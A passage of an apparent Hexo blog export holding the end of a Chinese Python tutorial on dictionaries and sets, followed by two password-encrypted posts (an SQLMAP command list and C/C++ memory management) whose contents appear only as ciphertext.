<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = &#123;</span><br><span class="line">      <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">      &#125;  </span><br><span class="line">	  </span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> f.keys():</span><br><span class="line">      print(name.title())</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Jen</span><br><span class="line">Sarah</span><br><span class="line">Edward</span><br><span class="line">Phil</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>三、遍历字典中的所有值</strong></font></p>
<p>如果你感兴趣的主要是字典包含的值，可使用方法values() ，它返回一个值列表，而不包含任何键。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> f.values():</span><br><span class="line">    print(g.title())</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Python</span><br><span class="line">C</span><br><span class="line">Ruby</span><br><span class="line">Python</span><br></pre></td></tr></table></figure>

<br>

<h4 id="6-4-字典的各种嵌套"><a href="#6-4-字典的各种嵌套" class="headerlink" title="6.4 字典的各种嵌套"></a><font color="#3CB371" face="Comic sans MS">6.4 字典的各种嵌套</font></h4><p>请自行查阅Python编程：从入门到实践 6.4</p>
<br>

<h4 id="6-5-字典内置函数-amp-方法"><a href="#6-5-字典内置函数-amp-方法" class="headerlink" title="6.5 字典内置函数&amp;方法"></a><font color="#3CB371" face="Comic sans MS">6.5 字典内置函数&amp;方法</font></h4><p>可查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-dictionary.html">Python字典函数&amp;方法</a>]</font></p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、Python字典包含了以下内置函数：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">cmp(dict1, dict2)<br>比较两个字典元素。</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">len(dict)<br>计算字典元素个数，即键的总数。</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">str(dict)<br>输出字典可打印的字符串表示。</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">type(variable)<br>返回输入的变量类型，如果变量是字典就返回字典类型。</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、Python字典包含了以下内置方法：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">方法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">dict.clear()<br>删除字典内所有元素</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">dict.copy()<br>返回一个字典的浅复制</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">dict.fromkeys(seq[, val])<br>创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">dict.get(key, default=None)<br>返回指定键的值，如果值不在字典中返回default值</td>
</tr>
<tr>
<td align="center">5</td>
<td align="left">dict.has_key(key)<br>如果键在字典dict里返回true，否则返回false</td>
</tr>
<tr>
<td align="center">6</td>
<td align="left">dict.items()<br>以列表返回可遍历的(键, 值) 元组数组</td>
</tr>
<tr>
<td align="center">7</td>
<td align="left">dict.keys()<br>以列表返回一个字典所有的键</td>
</tr>
<tr>
<td align="center">8</td>
<td align="left">dict.setdefault(key, default=None)<br>和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td>
</tr>
<tr>
<td align="center">9</td>
<td align="left">dict.update(dict2)<br>把字典dict2的键/值对更新到dict里</td>
</tr>
<tr>
<td align="center">10</td>
<td align="left">dict.values()<br>以列表返回字典中的所有值</td>
</tr>
<tr>
<td align="center">11</td>
<td align="left">pop(key[,default])<br>删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td>
</tr>
<tr>
<td align="center">12</td>
<td align="left">popitem()<br>随机返回并删除字典中的一对键和值。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="七-集合"><a href="#七-集合" class="headerlink" title="七. 集合"></a><font color="#FF6347" face="Comic sans MS">七. 集合</font></h3><blockquote>
<p><font color="#FF7F00"><strong>集合是什么：</strong></font></p>
</blockquote>
<ol>
<li>集合和字典类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在集合中，没有重复的key；</li>
<li>集合可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集，差等操作；</li>
<li>基本功能包括关系测试和消除重复元素。集合对象还支持 union（联合），intersection（交），difference（差）和 sysmmetric difference（对称差集）等数学运算；</li>
<li>大括号或 set() <strong>函数</strong>可以用来创建集合。注意：想要创建空集合，你必须使用 set() 而不是 {}。后者用于创建空字典。</li>
<li>注意：<font color="#FF7F00"><strong>set()只能放一个参数，它会将里面的字符串拆成字符，并且每个字符都是无序的（集合的属性）</strong></font>；</li>
<li>如果集合中包含多喝不可拆的元素，则必须用{}来定义集合。</li>
</ol>
<br>

<p>仔细分析如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">basket = &#123;</span><br><span class="line">	<span class="string">&#x27;apple&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;orange&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;apple&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;pear&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;orange&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;banana&#x27;</span>&#125;</span><br><span class="line">	</span><br><span class="line">print(basket)</span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">a = set(<span class="string">&#x27;abracadabra&#x27;</span>)</span><br><span class="line">b = set(<span class="string">&#x27;alacazam&#x27;</span>)</span><br><span class="line">c =set(<span class="string">&#x27;我们&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(a) </span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">print(a - b) </span><br><span class="line">print(a | b) </span><br><span class="line">print(a &amp; b) </span><br><span class="line">print(a ^ b ) </span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&#123;<span class="string">&#x27;pear&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;l&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;们&#x27;</span>, <span class="string">&#x27;我&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;b&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;l&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLMAP命令大全</title>
    <url>/post/SQLMAP-shell/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="d842378af413ecfcb668f6f413f1129e2ed364f8ffd31338f166fe24202f7f41"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Kali-SQLMAP</category>
      </categories>
      <tags>
        <tag>SQLMAP命令</tag>
      </tags>
  </entry>
  <entry>
    <title>C/C++ 语言内存管理</title>
    <url>/post/memory-management/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="5376182b3ee60e4c32b95f0ba8eed6ce4c6b77832779ca7b3cb96c82c9e5c53e">980e53ba04140d8819e663a9ac25387169eaeabbc71cdbd990ad79e198f3b2941fc9ab89fb2cd0c12ab2014ab78241ed344e1c33cc020880a7e7cf9f3dd0f38860792ad8a82287d37212436015f7e96530d6d82f438eb0ec56ade0aa1bf4b830014437963580f69c39de7355d2f83870d833823bb487eb644007c0ad8e8d6437ac6ca6a8b73257dd7dd8c46bd148b4da027236cbeba285e29a790077804cbbb5a45c1e6fd7f5a1dc712068dabdc5deae247d9bff09bb441825ed510b6c2286356d9f1d043d7f3f07e1cf7e1a2d441a382cc48b7d73429ee3e12e3c9b6f845c91920ed20033cfe60dcb946e49d99febb70ef1c47c27bb894943dfcfbbc6b1eece1a4ec51781036c9ec12270f0ed95ef55cf7638fa87b071e722193961fb6f57c2b65f57075f4aba08b9b4aaa90a4c169cbee5d8ed3b98559c6663fd51f7c86c0f0b69048d3bfec9fdbadec5634089f0c1d9a5ec7071def7322e312ff09f1812fa8b0e2134b99cd7f36a5b8d095450b5280e63a31e2cc69ec0e1f54c3aef12915b1f2d5ce94668bbd3fc170c900f3488c3784f0050e38e7fd1990af9b3ef091e37c462d1e5ae3d1285e5573195212940450114b5df3f417d4d88dfe4da99b91832d7e2bd8f6eb5c3e0518a413660ba1f04ec1c686b5184bbf9356a846928fdaa8530e1b846bda043c78ee777a0643826c11b748469f8e00e708e8e73c3a306c1714fed68e413c707f0e18ca660a5d066047e1e81a907c85e294795c7ba1b087e5b1b600d741ef323f148822c6b5467731ec71886616be17b2dd7dd437a110a07da47f5cd00ad8326ac1e69c93c78ccde72211543977e367e46019612dd53cd4760a93233a6b9146ab0066222726c9ee32eb3f9e7fdef3b9ddb50c3dfdf34b6660e62591cf38b413ed4aca7b283ee89dfc5893d243476b4af44a1fa3062ebb77750ea5da672f282ff5a4e9af2f6533f224ee9a4591e8397b439e2b5aea2d8d557c3da935554eaf62f0bfb99cd15565556e6546b2fa0b9f2853bcfc9ea5258bdc52929259fc9a2eac9ca41080a34b94fb7615ea2502a733397f86af1b471914eb1c6ce892e853476e945cbc3adec4de0ed0051047bd9a56578a426fc4ef227ae10f71bdf45c5d4400e83c97940f08e8503a4d43fb95c32b4f689493063e62135e774b978dedabd1617c2cbfc307a57f201cc8f9a5b999091f83d2823017e8009110e338025ac825d4dbcc9cf08eaf0c1a0fa3ea1347709d4e98a5e16ca1ef145594370986b1a8f7bd1b4b7939fe8c4e4d5725556a7442d3ae45e9e6e081e6803fb45eaabb85efd2aa15eb81bc6f909ca71bd6dd4cc518f22cc287c4ff07a1ff7f84b83dcb012ed5689237a8009e359b4626e1a58e5f0e5eb8abc8673f32682e36b3f91191ddb1524414a8d0564cb62c03156b11c50d5dd605c1f1386f9753235988828a415aec0bca4b9db4d1584fbddda9b28913d0e0379784a22bce8fb75ba904b687b7839b125d0a461fcf618bb8cb6c7aa4aba1a2825bceaccaed53e543411ffd772247f29207899482570ebfff449bdb48e2473d337b166f7953d9168d98cc8abfb8f470f483ca4d4b0ac92ec7af208f685b9411ac0a5f3482747e40ab55507c82b9151488ec9e61ba87ac5d4882f06fc55631a5c87538841ddf219429c7726bd6ed4cf753e160fe0812b78d6924097536ba82d77fb0e98feabac2fb3ec7d832c521f85ee1319ee185c1affe3ad5a6a963196512b49e0c39912dfd6dee567000da75fb9884a563c9a7ba7cd14b16e4c11522da6c65df7cdc35ef5b35ba5edd69e856c83434ca634fce0e2cfdad124a8400a87ae3111083f593420bcfc0e59de00ba6e001c8115e9e38ae12aa555547e7340007df62250821d92c07f6faf0e3421dbd139622d2671197dd20e7f7588f709bfb4872f484a2b0d84bc813602eef2023133f8ecb4af27435cb177ac6711902b82a285c7185200745fc004eef98c542e87356f1e2e164632cb7ec60a8cdaf07a5e70e2bed68d1b71e6263be4dad69e409f2da958c27c64ee8b5a02f3fe887d807cbcb8a30e04c8ee444f718b0f067087dff4ca4684e3a7e4f9fa4a680415f934dd1ba9841b2c72ec00be83d2bffc290be0b8c31e1f5c5cfada1b362251cfd345645c21a817f83a72a056a0cbe3fa751af625b5fe61e2c01fd8980b2071dc6baa2af49aedbea40c1709038f368250197fc010fff9928b8fe9a4e14b147892806a85325ff8a972ebceb32d27dc14cfc831c13650dc4843da2d833cb7b4e6dcafd1df7dd1fa18729afb56ee519e90b44fb33085851b9f834c6c404de5f4fa20e4c6e68fae3496c38d8e08fec8a582a9bea2b7d916bbcb639cbd7ccc0a2feba69d64770281af866b25824f0801672ecff25da86735f5dce03a89e90c501cbe103d0a1667574772140fedb796a40865c41f6d95f1720734d5f940aac081f344a308931ab6f9db25f9069f9885bae96542fde96391c0be1126ee8fdb5a5972eb0efae882c42e0d38d01e5b6367eab63e6e9bca7939a62be26e2d8245639baec36286a8fa42b99bebdb31616a39fe61ac7c9f47c44689846b0450e03e5a7722d968680df4190129654e09156aaa2a2ceb3bd1afb1a846ca4deca7bc5b3902b9c350766c94d9ce78a40b67bce7a0bfa17d2adad1712211c495c352b5dcf9c1e1cd210a1230f49c8e356733e0ab29df9106a06bd5138790e3f5d37e3ca63410fbd51f931fddc41d64d9e587198085842291ce33f623ce484dc00cb780df23f54b454445b6846151bf91368d78a6c0d62c6188e371f9f95d19f550e663d21fcaf940e1ec781ba30d0ced1f2414259bb5cca47072be4619165d948418b9b01e93d1eebe865b4e4752a15740ef54805c54021b3873f3f74b9f32317c89c5334fa49a9da3f5ad46bbfbe9de0a5ff40a8087caa1a9287d660e3b936dd18e0e6567cfdbec0254ccc1554f782ec09d208e6b526ae1c8db29b8ade94352ac0a0c46200b2201ceb9e92ddad55e1eb8dc0d103b1197a49395f2e29cb708a69063082f1e277f4e87bd9d5fa761389e7301e549dd25554356c93b8066b37cdc9d308077a6bbd4b3f9d9cd71841cbc8393a372b057e91d3b94fa34f59677d7c0cfe5f87d3e6e11147ffaf30ecd1b1d25a9a6b6e47bd92101a0e7021316515736b292fecf018298ae3d699ce878ce28c32f3d0df9116efc491a91859a2bac201db32d777778853a4bec3290736ff35776ab873a5449ecb333b12a961581e1093c3290b4586966504d5f7fbec6c41a277c95464f22660178c9393889bdcc8b2413037122bf65f0d0f255f5a57e6c613eb0c376c96c4fdad8fbfb0df33e14639009fbbd80406f8ed5db66eff7bf3e722aaca344b412568716dc73800fc039b854a806e2988bb94375b63fc6403bc354b39dde1b49ed5eede42fc894b5ebcdab20f487ccd9b3be90b9ab2a2981f038e725128e30adad858e81ebbd6487cfe52bdc0ef935ec0499a0a50f864e6b13509cd915aa772e2730fb5513a75209e5c2b63daf34cd4ae7e2657a2a39da2ec404d9639c9c66a46b340b5f4ab5fcac3f0085244d7018f3fa6853f2760023df5b1a62d0b595c4d798d8ce23466292fb4e50567e1d26864f657015525fe04e4c34306108b36bb39bb1408f8ec7d841573768245005699566a9b4b866471c464521688c7a7cb909e526a2a673f6c07212dbfdc53e7b9c6707cef80f7df47f5284f8665075f572254511665383bec2533ab1b381415cc38913e1f1c0be28c6f6211ab12418798d285535667e14508700bbadda5738b2a8c2b3c87a1f76481180625886fbf92a751d7b3f3eb3fd9c74f04e4485af5228bc1d24458f51b2e93a60c5f0618236a81b567f1ceb8c4d5e704d9aa040884fdd8e815a1a879d6ef67345e092301f9b3cfe3f104210b3e780af4ae7bc20ba6681aa08d3fd8043ff97c4255289b2c238d4daed64f361a2fed29930161a299f1ab014cff41dbca835098d7af2bebd4b553d8808339812a29406905dc28198aee36930cde6879910e142f747871198dae6a661008295bb1ef31bf7c204648f8383326cf3bb12b0d6d380b25a9c8ba9290c6d9c8fc7354ca339e31a03776d2ecfaec0c6a60db964847ac68867bc780c0a46ae1d40a56fbd0791073e6d34066a62906fe288921c2555bbb483bad0c0689891ad6af65c98caa80bba2dce9c855eabf2f9cc5e224d4d337627470b26b9ac347fe783bc0f90fc463be3e010309b02b40f77fde1fe07ba094d465a1cd14d0f5dbac3219136f346e2b975aaf808275e8d704e401a1bf6bfa6686137745af2a7288b2b3d2bee26c1a6356056c2be27e0c4f4b3fea64fbfcd5321526bd8963b0c510bf473d5b1c76f17580c255dcef4cc1b2fba54a1ec3ef9261a4992131b6f6a305d0a74074fde4765bcb6efe2b4d67e06c66eaa611a27c33c5b1af638e852b308bbe70e67cfb54fe6bb719d56d18fbca6338e1f7141264ecd01c4681340f8d858be095a896e81bf1650e4714c422a05f615809340213922563f0ae4344d2d26cac2794e0287f7cca653213328360c95b5f82d360d6f0da92b49f0c6651ad10b1c861b33005bda5724d40a25d605a0f71f5ae97f66ad7c65945a5e475da4047451a3222cd86067cf90be3d345cfe226c5250412283c475d66b43aae7dbcb81ac0ce9f3fa6d8c2a02ebe89ab09b7a3ec4de895ca38c2b9eb6a18f0180786aa9a734fbcd488de3afe18d8459867ad7e183d888a66052547b29bab3162e1242e2871de8991523fa800427e6ff1bf7457360d07911c6f82726a1622d8e2891cdedb46a60c8d3cc9c60057bc608b4e418ba92e56acf0abb2fd50a665ec6b0c3641173240a0de12905d30b314ca13c65f0e5276a4b9e1b19282fb1b5f6c61902528afa17a8f40bd38b835f6bd1211c51a416dd14cb36b53a976fe7a11415f57340cb3a133e96464b2c9a7fc023b784e14cd6cea79ad0a743f4dd07636394551d164c2206f4d5e72c6d90c4f6464cbb8fd98ebcfcdb454ca68d2aca41925411567e6d2c35a2f5a52d78f7a0bb7e0503f002a5ee2d97ebe2d1186291da46f195fb679bce2b11e6e9b101913d207e267054397430bd6896bdab7ca0d242f861cfbdc78ff29ad1cbc2fd787fb851bfa734b26f3ca2ca64f11b4b232c673172a7e92b6c247374e101657e7af2de74f31529add279b3e5328fc88139f735e4bda6e5eb0c2c3fd833c3f3c2a40c43b4789297a4b51f65245eefcb05e7197efb93d0dd1fba2ca7dad28588238787978b28532ff1b16ef82c606c5ca170c48855f18d61e15bdab119a5b35339c37dcae2b39471f6eb2d3bb2d3aeee571fbad54ee99b94dc23720b72a579ec923a505f47f0f77ada680786a5fb613f298ef4c39623f347d256363ade4c719812ef37617e3c783ccdb5c46397a59a28fe845741da63ef67bb40d5e8be32f50e200da6f8a3d82eadf774c3f0925ec26ee7d0d55897d621d584dc91ce78c36a610bc935d0cf91e9a63ae7fac0e9093cbf454866c47b0039219749c48afcb804a62512a28685bd9e485e4f13d062c9d04ff15d27edc6b492a2d42d3c625243293b7aa85378cd13913f0264b7e1fb961094480ee222e296b831191f216c953479d4db2f54a1e152de5407400b095daf18dcc26155b1837b58cfc7d8434125d861176f43d28997dc2b0af762c5d835c422f42268ff40f1ca511d25253720351a8a96c710a888926abb50b4695d6ca64c11cf5281bf4f2b85fb79c5641b0121864b143e23f332e7b4b67de9defd646865f8fd633a487dd2619d96b3f89b0b692a8684da6dce6d619f91e23cf8aa0abae75060c1e1d767f7b12286e4d890541c52e5c285f2905f22fd2a3bc427efbaa1225b426d0ce3553f6300f940442d53372c8ee3687e11e26e08f5c3710bf2bd027e2cad59d7d650a94beac6aae34c6cc56a383f31d0303c66b90087e93e305c72a8a79f40e0ba2d5370705049417107a04fe96a9f276f02c07c767b8ae130a7bfadb7633c58a226ce2b78d047a5260eedd485be7a4196a46ee8bdccb20248c464e1ac21068cbe59858892c9b7d3c1468365534ccf33e60bb60bf1168b3b99bc04bbe3349c3b3e6119d3c751087499f164438add8798bacb2adbf3cddf43904c814dd2a5ab7aed09a9bd7f4b8b02d9c6e60f22e5c13e28a0686e1ea576fdb5209053df9221437277f1c95c1fbdc0eb41cb73598fae48cee029fb58e3211bd60a6aa5bfac87b848b0844368deab67d592a6ccb9b46cae0f91171a5c2ee5426c0dc7d4c51eb2ba77769784283b0167f0989cbc3c10fe283d7041c57167a0509de74a2a8ede2d52641ed745b6faae9aa67f2a0a5d9ca8d3fde93ff62c91a60eb4e57f7c46360a805939c85a34d0a58f92d0a69eb667ffd83949588eb7b8d111269f15fe5165121af103349b2aedc7ec75c210aad345944879a9105c079134ad89e51e40edb20ca2da5613945cf8984f85f24467b686c2c65901409fa833787297b883869cf28527f8fe64ac9d317dfe9120bf3ec91b33c4abd340807d9cf98a246086f1c8f2bb5fa7dc5fc14d8f6e1e3654848f7eca1f6da79be0925f52b0b89ee136982b8a14d954d48c1910580ccc74174e2180a6099a1a146270c43155782edd3fcbbf3d17279b7eea1837ab0a67506560fa1c3d9a53bffebbbdb7bd307aca75bd456acfd104bb3c24affe21038f40c25c0d13574974d9e15efdda15a4d6be5ae93aee7d7ec4288c0681ff238079787a811854493672680e6f2fd6bab07bc3cb8b56312df3440c63aa5f5dc300092ecea021c9940ccef7e29341ae0a1d0f5ed193e3b794b20570c1cd5a9ae67b13c5c29206ecde48738c09e1e104bb1f27a91a901889bf07fd20b258addba9cfacb81b6b13b99cdb4c196b4743b8c145fd12df9358eb2bde1b59284cc8dcb7eb7606eb870825e6f82aafdbfb9a80d0a90f2b60128b20ca6510e1045313d610545c21c017f509a61a931c2c6dc94a72dbda69666e73c778a37b960e19caadf5c6742163bb4173f3c82ef8412835043aae003b4c7a66a4560f1e9654a10d8f32f5ea05253742a4ea9da0bcf63ac313b680ec18a36fd0a6e6704b74e16844e0ff2f00b58d776c10361b6b38533675c67e693237a1c3051f353a646592b8fcfc34de3cc02e16d159b9fc5fe32bde15ea24c6d54e55da68f753084ccfaa3806df46b6fe936695029d15a82846da1d8210c0fdda5e3bfc600a5232bf501742e7011426a748a8934b99256dd386aa603033cad655f2a3283c1fe83bac0993f1babf393beaea41ff139032058e5cd190f21899412f49f8e0b46fbe1fab0e1e7f36214ea081b424bd2e538fda06f57604c7d3d3e554a3f642fcd0656aab56991ceaeb9d1fac2c6558233c59880f2e0bdb2a93aaa1e7c2de73e01226a6ffde59e64701a5eab6d55a1c7258b5ba451f786c96e8f3165c4d7755f39139ffd46a6d7d0312eed23a2cdbe06a8d192fd88880e49127decd691252f42086ad6693926483debfea2b71af357e536c1b46c7b3aee1ece6005eae669c14a3daf1384120564aa31313d457bf7f6232e8525f0faffc5612095d0c2f50270c3e16dc4b53a14ef3623f25d2ff8a02c4befb1db20d6786b001d021a20fe178334507c4e95630f02da732db5ae2f35c5e85cb3c1e26f9bfe1a122e6820c595c09c7c98077e0d94513903766b2d7bed70ca4d6e0cf851b7c815f3315a20176d1b643b28f08dde2df2930abbdf4fad8b08eeedf1e6492e68f648ceaa5da893f6d3be66d9016f6ff9a0c1e481b5fb02b03aec257cdc5de0a875589b79afbf864a0ae5e06ceec09e1a9823568f09563f6c5fbcf088c2340829f3b42202891a7d3462d97febedd122e94e5692a1ba8da0b744721e012e55d893d0b5e90c5112eb7bde69c7352bb40915dc1c0746eb4df17149087a423b83356f85dfe84fc7d64fbd30944d5ffb232793a92ecf31063a7feb4b9e99a1697fa2cebd6139b9df712150b825c919e4c9a3395f1da39e0369ef409744abae7e40f51d79924ebc70401f4f9bf9e9597b0674e414d9e2d041dfe56986c9c3164046eb72166e9dbf340271e42997b3f6cd9712805837962d6bbde324ee96660900f1caeba6efd8633f43c3601e5dcf7f8d32f090ccc7d859fcd2e59ab90c9c4dd4b6ec72aacca7a21ad8a257632fbb96038d89d496bc4c7ece29ec059b2d1c6e45fabd5bdb0c8ab0e34081b5789a263621333a2f92c4845f41c218472c609ccee0fea963bc9156cef3d1a88384ae601014a995b42147f5a81781abc551428fa9067aecc7d2f3c95ae17d7f54b7d8e225680cb5159569f0ae31e99288eaddebeee595c2529c2500975d911f790287f28caaf86519da76565ffddabd09ce6068f9fe52884b90887202a6dca8485883d3d9ba2735cc1d9cdb93f09236e9ca55bb4db5bba3e78004800f9cf14e0ca01c8939ac6c0abf5c1568a7213dd41c2ef0fc89f655b65bd34fa5fe067bd7cc3763fbb8ff869b4b631b23e16f1507f2d41a6922240fad34ecde32b7de825ee74fd092c12067b59e7d147fcced23773ac93471f62bd9998358163477c25da90f52cac5fa888ba2a1ed4953610f2565c582b0807e43450ca36b1d397a3374fc8a5618c3cd3b13e3f90aae7b4a60df3eff565357fc7b2faa13de365887a56e686c4074aacb0b41e708912ed170a9c3fbad5fdc68d93103bec76deb5bc00de516a459bcffb4d414c78f8a3b726c934fac88b596a80d748ca63780d37a129225a73a733ad2b22e497e8d125748b7fb57803fb237ee0b98ded6f83612a42dd8adf58cc5a14953e01425797127f290f5f7135e8d9b5ca8d899af16acfd0ae14efd4213e9e07f9eeef6944c99a45716b22e1c566a648b0bda9a739325848969c840aff24a890249c55d7302b545581905f9483e6df69518c337e92499a94db3a9cb6fca7cc34346cbb177d8bbac273485ca1040f43a883ada707db9221002dcbce61982d3a3fea1beba9b5f6057353c5e86c10cefaa060ade7931de14a5dd93347564ebdb92985aca610758c9701d11765c67f45cd0b9f0d75efdbff85a86d309aff27583d62cda5dd6db97749b3b7cbae583b904a34a75a4c6f97a61639f08e04be02a716cf97e6d38338e5f573dc3fc43d203c01e8556788e85e07256106c704e786f92fc36b7acd98c6e547125bb83fe8df0969e0f58936d5553f88851e8b582af9c0b855abc660c9504b873672c636e9628d9aeeee722891e003127865c0c80ca6ee79f36dd0cbfc36cda5199729813680b5ab4a3d0736b9316fc7d89296767c59441da74feb697b92241be5801546764efbbbea3febe6408c187048e494e803d778f282a0a2843a1a8bc6e831587ca4ad5ed7f32bc56ebc532c94565ed11d0eeb3b9419fa8a97a29962f30c8b5dfc0679cfafd787afc65e9a98bf77e18510c71fe7a3b2bb74bb5d99aa960cd568db4cfe01a1d2537f2b5b19fb8e084bb74595175708f7c5ed14a74aa035a0572f888da1180aa1ebc7ef83c52643e07d683ab79f486f6a2bf8e91a6ce91e652f1bb444e0d706e8325435a2152cb9dbf6cf471ba62c9a123cb54aff7056a259295181d35c2fc590961051ff2099a19eabc1fdb261007921a5fe828bc76ce0ed9e033e7d3524c96547f86e49bab409b5646d30de932aed0bb51e131d7cdaca99eb6fad7fa31981506bc51d8d3ec4754fed7ea4d8a33774b5752cdf48c6410bcb7c735dc0274becaf66ebb378fb2a9e7b95cba80440c8291aab578bf47c9c061a39f06216ee71741a9cd8df2c645a3fad1569fff5b3b7fc9755fbff0990d870f58eff63724fccdcbf3c1667760562f739ee217c904eb8c75793e3945df4f97d231843f2150a27c51aca9ead754406a03739f72dc0573943ef52c8649b35e9e91519bec37c8e223cf2e5d564607274f59210a6e6b93927f975e525d50e5aa0dfbaa10a2c085a007fc881bb637a676927d6e7e331193cdee3dc291eecdc7379673a946cf590e399cbc33e79b6515bd0076a43ec9132469c9736e508c076d826a7f3c6bf7d11429379fcf59ba619a5ea0bc50349e1bf5cbddafe51ec1a1467460a3681208ad349bf8579ece48a3565349999982fd34f013e1a87b50655b54b728511178c998e296b800b5eb01d3137174077c7852a8d52804613569821bd340506337c8eae9e0196e3e600a94799e8efa514ad8146dfeb7298694751a81134374f457da3dcc579af651225c72bbc4685becc55a193ad7b5f231077d821b4afd699731d25b89e55063d2cb51347b7a548b5ae841ed51b7e71af24b925bc7013f1f4f931a73688551063ff0dc0f759ec6ab49f27ef416230890158e4ecf4fbe2602693074bc7c60f8da802f7e688baa431b8922a96e2781f7db2483d83fa54203470f01a5e86c94f907f5fadeaa5130c60fa4ff75f791cf6e65ddc1a6cb6e4078f1f22fa127b21c01d0869858aa8285b0ce9ac9d9af58fc35057b6841025933d02ffe42f3ecc6fd75f53cf19d0dfded61c0161b80d2b0d425a0d643a27d048807a7357ce8